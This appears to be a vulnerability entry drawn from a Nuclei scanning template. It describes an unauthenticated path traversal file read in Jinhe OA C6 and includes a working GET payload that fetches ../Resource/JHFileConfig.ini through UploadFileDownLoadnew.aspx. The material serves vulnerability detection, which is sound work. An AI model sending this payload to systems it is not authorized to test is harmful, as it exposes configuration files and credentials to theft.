# Nuclei Template: Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read
**Template ID:** jinhe-oa-c6-upload-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`jinhe-oa-c6-upload-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in Extremely unsafe state.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini
```

## References
- https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
